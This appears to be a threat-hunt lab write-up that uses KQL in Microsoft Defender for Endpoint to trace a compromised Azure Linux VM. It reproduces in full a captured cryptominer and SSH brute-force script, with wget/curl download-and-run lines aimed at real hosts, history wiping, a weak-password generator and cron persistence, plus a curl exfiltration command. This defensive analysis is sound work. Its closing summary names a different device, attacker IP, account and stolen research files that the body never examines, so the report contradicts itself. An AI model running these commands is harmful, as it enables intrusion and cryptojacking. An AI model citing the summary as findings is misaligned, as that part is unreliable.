# Threat Hunt Challenge: Azure Abuse Notice

## Platforms and Languages Leveraged
- **Windows 10 Virtual Machines** (Microsoft Azure)
- **EDR Platform**: Microsoft Defender for Endpoint
- **Kusto Query Language (KQL)**

## Scenario
Your SOC team received an urgent email from Microsoft Azure Safeguards Team
regarding potential misuse of Azure resources. Microsoft flagged your subscription for
external reports of brute-force attacks originating from one of your IP addresses. Your
organization's reputation—and your Azure subscription—is at stake.
Your SOC Manager urgently tasks you with investigating this alert. You must determine if
there's truth to these allegations and, if so, uncover how deep the compromise goes. 

---

## Steps Taken

### 1. . Validate the Allegation:

To start the investigation, I searched the **AzureNetworkAnalytics_CL** and **`DeviceLogonEvents`** table to verify ownership of the reported IP and confirm the brute force attack pattern from our environment. Our first query shows the name, MAC, Private and Public IP, aswell as the subnetwork which displays the cyber-range, our organization, confirming that the IP does infact belong to us.

**Query Used**:
```kql
AzureNetworkAnalytics_CL
| where PublicIPAddresses_s == "20.81.228.191"
| project TimeGenerated, Name_s,MACAddress_s, PrivateIPAddresses_s, PublicIPAddresses_s, Subnetwork_s
```
![image](https://github.com/user-attachments/assets/9564a07f-8f8b-4eee-97da-339979188f94)


The second query shows that the Public IP address reported, has indeed shown patterns of brute-force attacks on the device "xxlinuxprofixxx" with 100 failed login attempts over 2 minutes using the root account. With this, we can validate the allegation.

**Query Used**:
```kql
let failure_threshold = 10;
let time_window = 720h;
let trigger_window = 60s;
DeviceLogonEvents
| where (RemoteIP contains "20.81.228.191" or RemoteIP contains "10.0.0.217")  // Filter for your compromised device IPs
| where ActionType == "LogonFailed"
| where Timestamp > ago(time_window)
| summarize FailedLogonCount = count()by bin(Timestamp, trigger_window), DeviceName,DeviceId, RemoteIP, AccountName
| where FailedLogonCount >= failure_threshold
| extend ReportId = strcat("LogonFailureAlert_", DeviceName, "_", format_datetime(Timestamp, 'yyyyMMdd_HHmmss')) // Dynamic ReportId
| order by Timestamp desc
```
![image](https://github.com/user-attachments/assets/8e4478ec-f656-410e-ae6a-2dfcebb9be7a)


### 2. Trace the Origin of Malicious Activity: 

Next, I examined the DeviceInfo table to identify the compromised host, "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net", which is a linux platform. 

**Query Used**:
```kql
DeviceInfo
| where PublicIP == "20.81.228.191"
| project Timestamp,DeviceName, PublicIP, OSPlatform
```
![image](https://github.com/user-attachments/assets/9c3f2854-d717-47ca-a492-cce775273da1)

Now that we have the host, we will comb through Logon Events, File Events, and Process Events to determine malicious activity began and how the system was compromised. 

Our first look at the logon events shows that the device has several IPs that stand out: 
**Query Used**:
```kql
let failure_threshold = 10;
let time_window = 90d;
let trigger_window = 60s;
DeviceLogonEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where ActionType == "LogonFailed"
| where Timestamp > ago(time_window)
| summarize FailedLogonCount = count()by bin(Timestamp, trigger_window), DeviceName,DeviceId, RemoteIP, AccountName
| where FailedLogonCount >= failure_threshold
| extend ReportId = strcat("LogonFailureAlert_", DeviceName, "_", format_datetime(Timestamp, 'yyyyMMdd_HHmmss')) // Dynamic ReportId
| order by Timestamp desc
```
![image](https://github.com/user-attachments/assets/bb99b14d-0e93-4c2c-aec5-ab7c9add181b)

During the time of 0441 to 0445 on March 14th 2025, we see that the IP 8.219.145.111 has 92 failed attempts over SSHD as root, cursory reserach into the IP revelaed that it is a malicious IP via MalwareURL database. No sucessful logins were made by this IP. Next is the IP 10.0.0.217, this private IP belongs to the host and is suspsected to be a brute force test by the authorized user as seen by the account names under the attempts. The last IP 10.0.0.8 is the local scan engine in the range, although 91 attempts over 2 minutes is suspicious at a glance, this appears to be normal behavior for the local scan engine when investigating its acivity. This IP is the only one of the failed attempts to have successful logons, this is believed to be credentialed internal scanning through tenable.

Our second look will be through daily Process Events in which we see unusual activity, the first of which is the command line for - bash useradd -m testuser followed by passwd -d testuser, this means that there is a account on the device that does not need credentials to access the device, it is believed that the authorized user had created this to trigger a flag in the tenable scanning.

![image](https://github.com/user-attachments/assets/1ec489bf-5cc4-4625-82be-411b8faab76e)

Further investigation sees a sucessful SSHD logon at 0546 AM March 14th, this is validated against the device logon activity from 20.169.181.216., a data center in VA. The details of the process is sshd: [accepted], followed by sh -c "/usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new". What this means is that the message of the day is running which seems nornmal enough, however In the context of potential exploits, the /etc/update-motd.d/ directory can be used to run scripts as root, which can be a target for persistence mechanisms in attacks. A malicious script in this directory would be executed each time a user logs in, potentially running unauthorized commands or reconnaissance as seen with the motd.d/50-landscape-sysinfo, update-motd.d/91-release-upgrade,update-motd.d/90-updates-available  and who-q leading to a commmand to update motd fsack at reboot to determine the system's resilence. The recon chain continues with grep commands such as -q -m 1, and bash -c 'nvidia-smi -q | grep "Product Name"' to ascertain the GPU of the device leading to another logon from the same IP with the same process of MOTD following.

![image](https://github.com/user-attachments/assets/a69feeb5-8364-4db0-99cd-7cb9b89d2381)
![image](https://github.com/user-attachments/assets/b12c7771-29ad-406c-aa93-d3846867eb38)
![image](https://github.com/user-attachments/assets/fc8419db-ef24-4e7f-ac8b-aa4fe356f04e)
![image](https://github.com/user-attachments/assets/7e425515-c9d9-4f9f-94e0-f95cde577ef6)
![image](https://github.com/user-attachments/assets/ecf7de80-6d79-45c0-9f1a-a173413a26fe)
![image](https://github.com/user-attachments/assets/6ccbec14-7e37-44b7-b164-55f660110b82)
![image](https://github.com/user-attachments/assets/20cf6b24-c562-42eb-9d99-9e80b4e1a31c)


We would then observe that a suspect executable from the systemd that seems to be titled with obsfucation to avoid detection at nearly the same time as the Message of the day update header, I suspect that the header was manipulated to inject malicious code and trigger this exploit upon review of the SSHD Login process, the 00-header process, most of the MOTD processes, the sh -c "pkill -9 intelshell >/dev/null 2>&1", sh -c "pkill -STOP Chrome >/dev/null 2>&1", and sh -c "pkill -STOP cnrig >/dev/null 2>&1"  SHA256 Hash to be one and the same 4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483. 

![image](https://github.com/user-attachments/assets/6e8768bb-b07c-4ddf-82af-8ca182a4de47)
![image](https://github.com/user-attachments/assets/9d3d6374-1a4f-4e6b-9d8e-fd83598ee2e4)
![image](https://github.com/user-attachments/assets/285f3d22-997f-45ec-a462-e522395df270)
![image](https://github.com/user-attachments/assets/a356001c-b744-46dc-a1b4-3d97226a81b3)
![image](https://github.com/user-attachments/assets/bf1b052f-a5c5-44b8-9e0f-7a460e249774)
![image](https://github.com/user-attachments/assets/0c5fb201-b2d9-4506-9c1d-b0d42d8fd8da)

Based on this initial process, it seems to be killing certain services and processes such as chrome and cnrig, this seems to be indicative of exploiting the device to cryptomining and stopping competitive mining if present. The exploit would then deploy a malicious script for cryptomining with persistence mechanisms, system compromise techniques, and a focus on data exfiltration:

```
#!/bin/bash
key=$1
user=$2
if [[ $key == "KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]]
then
    echo -e ""
else
    echo "Logged with successfully."
    rm -rf .retea
    crontab -r
    pkill xrx
    pkill haiduc
    pkill blacku
    pkill xMEu
    cd /var/tmp
    rm -rf /dev/shm/.x /var/tmp/.update-logs /var/tmp/Documents /tmp/.tmp
    mkdir /tmp/.tmp
    pkill Opera
    rm -rf xmrig .diicot .black Opera
    rm -rf .black xmrig.1
    pkill cnrig
    pkill java
    killall java
    pkill xmrig
    killall cnrig
    killall xmrig
    wget -q dinpasiune.com/payload || curl -O -s -L dinpasiune.com/payload || wget 85.31.47.99/payload || curl -O -s -L 85.31.47.99/payload
    chmod +x *
    ./payload >/dev/null 2>&1 & disown
    history -c
    rm -rf .bash_history ~/.bash_history
    chmod +x .teaca
    ./.teaca > /dev/null 2>&1
    history -c
    rm -rf .bash_history ~/.bash_history
fi

rm -rf /etc/sysctl.conf
echo "fs.file-max = 2097152" > /etc/sysctl.conf
sysctl -p
ulimit -Hn
ulimit -n 99999 -u 999999

cd /dev/shm
mkdir /dev/shm/.x > /dev/null 2>&1
mv network .x/
cd .x
rm -rf retea ips iptemp ips iplist
sleep 1
rm -rf pass

useri=`cat /etc/passwd |grep -v nologin |grep -v false |grep -v sync |grep -v halt |grep -v shutdown |cut -d: -f1`
echo $useri > .usrs
pasus=.usrs
check=`grep -c . .usrs`

for us in $(cat $pasus) ; do
    printf "$us $us\n" >> pass
    printf "$us "$us"\n" >> pass
    printf "$us "$us"123\n" >> pass
    printf "$us "$us"123456\n" >> pass
    printf "$us 123456\n" >> pass
    printf "$us 1\n" >> pass
    printf "$us 12\n" >> pass
    printf "$us 123\n" >> pass
    printf "$us 1234\n" >> pass
    printf "$us 12345\n" >> pass
    printf "$us 12345678\n" >> pass
    printf "$us 123456789\n" >> pass
    printf "$us 123.com\n" >> pass
    printf "$us 123456.com\n" >> pass
    printf "$us 123\n" >> pass
    printf "$us 1qaz@WSX\n" >> pass
    printf "$us "$us"@123\n" >> pass
    printf "$us "$us"@1234\n" >> pass
    printf "$us "$us"@123456\n" >> pass
    printf "$us "$us"123\n" >> pass
    printf "$us "$us"1234\n" >> pass
    printf "$us "$us"123456\n" >> pass
    printf "$us qwer1234\n" >> pass
    printf "$us 111111\n" >> pass
    printf "$us Passw0rd\n" >> pass
    printf "$us P@ssw0rd\n" >> pass
    printf "$us qaz123!@#\n" >> pass
    printf "$us !@#\n" >> pass
    printf "$us password\n" >> pass
    printf "$us Huawei@123\n" >> pass
done

wait
sleep 0.5
cat bios.txt | sort -R | uniq | uniq > i
cat i > bios.txt

./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history"

sleep 25

function Miner {
    rm -rf /dev/shm/retea /dev/shm/.magic
    rm -rf /dev/shm/.x ~/retea /tmp/kuak /tmp/diicot /tmp/.diicot
    rm -rf ~/.bash_history
    history -c
}

Miner
```

***Malicious Elements:***

**Remote Payload Download & Execution:**
--The script uses wget and curl to download and execute payloads from suspicious domains (e.g., dinpasiune.com and 85.31.47.99), potentially delivering a cryptominer or other malware.

**System Cleanup & Concealment:**
--Clears evidence by deleting logs (.bash_history, history -c) and critical files (e.g., /var/tmp/.update-logs).
--Deletes or disables competing malware or services by killing processes (pkill xmrig, pkill java, etc.).

**Password List Generation:**
--Generates weak default passwords for users by extracting system usernames (cat /etc/passwd) and creating combinations of usernames and weak password strings like 123456, password, Passw0rd.

**Persistence Mechanisms:**
--The script recreates critical files (/etc/sysctl.conf), updates file limits, and ensures system stability for continued operation of the malware.
--It also re-establishes itself through crontab manipulation and uses /dev/shm/.x for storing malicious files, which is commonly used for persistence.

**Crontab & SSH Key Manipulation:**
--Crontab entries are removed, potentially removing legitimate or other scheduled tasks, while setting up new ones to run the miner regularly.
--SSH keys are manipulated (chattr -iae ~/.ssh/authorized_keys) to avoid detection or disable administrative access.

**Connection Attempts & Data Exfiltration:**
--The ./network component and references to .diicot indicate potential exfiltration of sensitive data or continued control through a network communication mechanism.

**Miner Function:**
--Cleans up the environment by removing evidence and attempting to continue cryptomining operations using files like /tmp/kuak or /var/tmp/Documents/.diicot.

**SHA256:**
--The SHA256 hash provided (59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4) refers to the binary or script identified in this incident, useful for file identification in threat databases.

This would be followed by a sequence of commands from the script designed to extract valid user accounts from the system and manipulate data for further use in an attack, and another script performing several actions related to system manipulation, persistence, and concealment SHA256 hash provided (cbd686aa89749264552a9c11c3cf6a091991a123359ef2e5cafff3a0b05ef255). 

![image](https://github.com/user-attachments/assets/486d37f4-8483-4fb1-9ef0-cd033ce2211e)
```
bash
./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1
crontab -r
chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1
cd /var/tmp
chattr -iae /var/tmp/Documents/.diicot
pkill Opera
pkill cnrig
pkill java
killall java
pkill xmrig
killall cnrig
killall xmrig
cd /var/tmp/
mv /var/tmp/diicot /var/tmp/Documents/.diicot
mv /var/tmp/kuak /var/tmp/Documents/kuak
cd /var/tmp/Documents
chmod +x .*
/var/tmp/Documents/.diicot >/dev/null 2>&1 & disown
history -c
rm -rf .bash_history ~/.bash_history
rm -rf /tmp/cache
cd /tmp/
wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu
mv .balu cache
chmod +x cache
./cache >/dev/null 2>&1 & disown
history -c
rm -rf .bash_history ~/.bash_history"
```
Further investigation revealed a persistent threat targeting the system, leveraging services, scripts, and cron jobs to conduct malicious activities such as SSH brute-forcing and potential data mining. The activities centered around the /var/tmp/.update-logs/ directory and specifically the use of the .bisis executable, which facilitated network exploitation and unauthorized access. 

**Systemctl Service Manipulation**

![image](https://github.com/user-attachments/assets/d0d9a2d2-2f5c-431d-9c55-8c5b89fb583a)


The malicious actor set up the persistence by enabling a custom service through systemctl. This action ensures that the service, named "myservice", starts upon system boot, providing continuous execution of the malicious processes after reboots.

Effect: This tactic guarantees that malicious activities continue running in the background, regardless of any system reboots or shutdowns. This service likely points to a malicious script that the attacker can control remotely or leverage for unauthorized access or brute-force operations.

**Creation and Execution of Cron Jobs:**

![image](https://github.com/user-attachments/assets/52f228b7-4bff-43af-b80c-f9f42ad8477f)
```
bash -c "echo '@daily
 /var/tmp/.update-logs/./History >/dev/null 2>&1 & disown @reboot /var/tmp/.update-logs/./Update >/dev/null 2>&1 & disown * * * * *
/var/tmp/.update-logs/./History >/dev/null 2>&1 & disown @monthly /var/tmp/.update-logs/./Update >/dev/null 2>&1 & disown * * * * *
/var/tmp/.update-logs/./.b >/dev/null 2>&1 & disown'
| crontab -"
```

This command created multiple cron jobs to execute files from the /var/tmp/.update-logs/ directory on a daily, monthly, and minute-by-minute basis. These jobs are set to run in the background using the disown command to detach from the terminal and avoid monitoring.

Files scheduled by cron jobs:

Update: Appears to be a key malware component.
History: Likely logs or tracks system history.
.b: Another malicious file, potentially used for network exploitation or lateral movement.

**Suspicious Script Execution and System Modification:**

![image](https://github.com/user-attachments/assets/a34598cc-500e-4c7e-8d6e-d594226ece18)


```
bash -c "cd /var/tmp/.update-logs ;
 chmod +x /var/tmp/.update-logs/.bisis ;
ulimit -n 999999 ;
cat /var/tmp/.update-logs/iplist
| /var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8 ;
 /var/tmp/.update-logs/x"
```
This command executes the .bisis file after setting permissions to allow execution (chmod +x). The ulimit -n 999999 command increases the maximum number of open file descriptors, indicating an attempt to handle a large volume of connections or network operations.

The .bisis file is used to read from an iplist file and perform SSH connections with no authentication (--userauth none) via the ssh command, targeting multiple IP addresses. The involvement of the iplist and data.json suggests a brute-force SSH attack or exploitation attempt across a list of IP addresses.

**.bisis File Execution:**

![image](https://github.com/user-attachments/assets/f404cbe9-7706-4e02-9a30-f41d6a186d24)
![image](https://github.com/user-attachments/assets/cf088d40-e533-4f2f-8c7d-68e9fce76ad8)

The .bisis executable is responsible for performing SSH connections with no user authentication, likely for brute-force attempts or network probing. The file reads IP addresses from the iplist file and attempts connections using the ssh command.


After some time there have been a continuous string of processes implemented by CRON mirroring the /var/tmp/.update-logs/Update pattern leading to /var/tmp/.update-logs/.bisis activating on the system over and over with a minute to two minute pauses in addition of pgrep -x cache commands which produced a cache file over 1MB, The cache process executed here reinforces the likelihood of a persistent, scripted attack that leverages cron jobs and temporary directories for continued malicious operations. The malware has established mechanisms to remain active and hide its processes, potentially involving data mining or other unauthorized activities.

The cache file, based on its size, frequency, and placement in /tmp, could be related to data storage, exfiltration, or other malicious caching techniques.

Now up until 0617 AM, there haven't been any deviations from this pattern until a initiating process from the systemd led to a process command line of /bin/bash /usr/bin/ssshd. This stands out from the observed behavior as this log indicates that the root user is invoking a bash process associated with /usr/bin/ssshd. The suspicious file path (/usr/bin/ssshd) is likely a masquerading file. Attackers often name malicious binaries in ways that mimic legitimate services, such as sshd (the OpenSSH daemon), adding extra characters (e.g., ssshd) to evade detection.

This is followed by the root user executing a command to use curl for connecting to an external IP address (196.251.114.67) and downloading a file from a suspicious path (/.x/black3). This behavior is typical of malware trying to download additional components or payloads from a remote server.

![image](https://github.com/user-attachments/assets/70b5ffd6-0bd5-48eb-826d-0b0cdadf5c51)

**Key Observations:**

**Suspicious File (ssshd):** The process /usr/bin/ssshd is most likely masquerading as a legitimate service to avoid detection. The addition of extra characters to resemble sshd is a common tactic used by attackers to disguise malicious files.

**External Connection (196.251.114.67):** The use of curl to contact an external server located in Amsterdam (196.251.114.67) and download a file from the .x/black3 path indicates that the system is trying to retrieve potentially malicious payloads. This IP address is most likely associated with an attacker-controlled server.

**Automated Activity:** The repeated execution of bash commands, coupled with the ssshd service, suggests this is part of an automated infection or malware behavior, possibly trying to maintain persistence or fetch additional resources for exploitation.

The malicious activity would cease until a CRON command at 0727 AM resumed the pattern for /bin/bash /var/tmp/.update-logs/./.b with various pauses of various lengths through the monring, and the observance of the /usr/sbin/sshd -D -R followed MOTD exploit was seen again at 0740 AM leading to another instance of a CRON command at 0755 AM with update-logs pattern followed by the ssshd to curl 196.251.114.67 followed by new additions to the pattern in the form of process commands such as /bin/bash /var/tmp/.update-logs/x followed by  cat data.json, grep OpenSSH, and awk -F " '/"ip":/ {ip=$4} /"userauth":/ && /password/ {print ip}' .temp. 

This indicates that the script located at /var/tmp/.update-logs/x is attempting to read and possibly process a file named data.json. The contents of this file could be related to the attacker’s data collection, such as credentials or system data.

![image](https://github.com/user-attachments/assets/baf61e77-5739-4b7b-82fd-34bea2e45d0d)

The grep command is filtering content to search for occurrences of "OpenSSH." This suggests the attacker might be looking for logs or information related to OpenSSH, which could include SSH authentication attempts, possibly indicating an interest in exploiting SSH-related vulnerabilities. 

![image](https://github.com/user-attachments/assets/7390fd32-c24c-426b-8311-18a5c6839db3)

The awk command filters through a file named .temp to extract IP addresses related to password-based user authentication attempts. The pattern being matched, "userauth" and "password", suggests that this process is attempting to harvest IP addresses associated with SSH login attempts using password-based authentication, potentially identifying weak or compromised accounts.

![image](https://github.com/user-attachments/assets/1e9df02a-93b6-4f2d-b60b-37f134e88c30)

These commands are characteristic of post-compromise activity, where the attacker is leveraging the system to extract valuable information, likely to exploit SSH vulnerabilities or credential weaknesses further. The suspicious behavior of processing data in hidden directories like /var/tmp/.update-logs/ and using tools like awk, grep, and cat to sift through data files and logs points to a malicious intent.

At 0826 AM another ssshd pattern was observed followed by another /var/tmp/.update-logs/Update pattern at 0829 AM and a CRON command for /bin/sh -c "/var/tmp/.update-logs/./History >/dev/null 2>&1 & disown" at 0831 AM followed by another at 0833 AM ending in a ./cache command. Theses series of patterns occur once more before 0846 AM until a shutdown executed by root occured at 0904 AM March 14th 2025. The Device would be active again at March 17 2025 at 0320 AM, a CRON to update-logs, cache, and pidof update pattern was observed at 0321 AM indicating that the malware was still present during the authorized user's labs 

![image](https://github.com/user-attachments/assets/da0832d5-6da9-4a56-a967-b248a23ca3ad)

The Device carries on as usual with the malware, until a suspcious telnet login attempt was made at 0328 AM from IP 114.41.214.182 which turned out to be from taiwan, the process logs continued to show telnet processes which would be indicative of a continued presence from the previous telnet login followed by a series of what appear to be Reconnaissance Activity

![image](https://github.com/user-attachments/assets/9f3c14dd-4c35-420d-b47f-7688ac5dd5c9)
![image](https://github.com/user-attachments/assets/066b8a45-a88b-4c97-a69d-22a40081e0f6)

From that time until 0343 AM, the user applied updates to the linux machine however the malware was still present as observed at 0344 AM when a CRON to update-logs pattern occured. The device then proceeds as usual with the malware until new behavior from the malware was observed at 0448 AM, this behavior is consistent with data exfiltration when observing the code:


```bash -c 'curl --silent "http://196.251.73.38:47/save-data?IP=200.98.137.5" \
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
    -H "Accept-Language: en-US,en;q=0.9" \
    -H "Cache-Control: max-age=0" \
    -H "Connection: keep-alive" \
    -H "Upgrade-Insecure-Requests: 1" \
    --insecure'
```


![image](https://github.com/user-attachments/assets/31143b39-2e80-4ca9-963c-3d242ffc0b0a)

This process is trying to exfiltrate data to an external IP 196.251.73.38 using the curl command. It is passing an IP address 200.98.137.5 as a parameter in the URL, possibly representing the internal system IP or another target in the attack chain. The command includes several headers (e.g., Accept, Accept-Language, Connection, etc.), indicating the request is trying to mimic legitimate web traffic, but using the --insecure flag to bypass SSL certificate verification, further supporting that this is malicious.

These logs show that the process repeats itself multiple times, indicating that data exfiltration is continuous. This behavior strongly points to an active and persistent compromise, where the attacker is collecting and sending sensitive information out of the system in small batches to avoid detection. There were 196 occurrences with a total file size of 162,371,104 bytes (around 162 MB).

This behavior would now be observed in addition to the usual malware behavior throughout the rest of the device's activities all the way to 0645 PM to it's last process.




### Summary of Findings
-Compromised Device: corpnet-1-ny

-Attacker's Public IP Address: 102.37.140.95

-Number of Failed Login Attempts: 14

-Account Created by the Attacker: chadwick.s

-Stolen Files: a gene_editing_papers.zip "CRISPR-X__Next-Generation_Gene_Editing_for_Artificial_Evolution.pdf" "Genetic_Drift_in_Hyper-Evolving_Species__A_Case_Study.pdf" "Mutagenic_Pathways_and_Cellular_Adaptation.pdf" "Mutational_Therapy__Theoretical_Applications_in_Human_Enhancement.pdf" "Spontaneous_Mutations_in_Simulated Microbial Ecosystems"

### Response Taken
Upon identifying the compromised device and account, I took steps to isolate corpnet-1-ny from the network to prevent further data exfiltration. The chadwick.s account was flagged for further investigation, and incident response teams were alerted to the presence of stolen research files. Additionally, the system logs were preserved for forensic analysis and evidence gathering.
